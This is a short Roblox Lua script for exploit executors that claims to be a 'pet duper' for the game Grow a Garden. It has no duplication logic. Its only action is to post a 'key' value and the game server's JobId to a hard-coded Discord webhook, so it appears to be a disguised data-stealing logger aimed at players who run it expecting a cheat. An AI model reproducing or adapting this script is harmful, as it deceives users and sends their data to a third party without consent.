local key = key1 ;
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Content = 'Grow a Garden pet duper real';
local Embed = {
    title = 'REAL pet duper';
    color = '99999';
    footer = { text = game.JobId };
    author = {
        name = 'ROBLOX';
        url = 'https://www.roblox.com/';
    };
    fields = {
        {
            name = 'dupe';
            value = key;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1243366209395884093/adCgtBDIFOreRq1Z9C3MqRbszQV33WDQ1SbrUIOZ-w1EFXDdB9Yvpladkg3PvA_Tkxi-';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
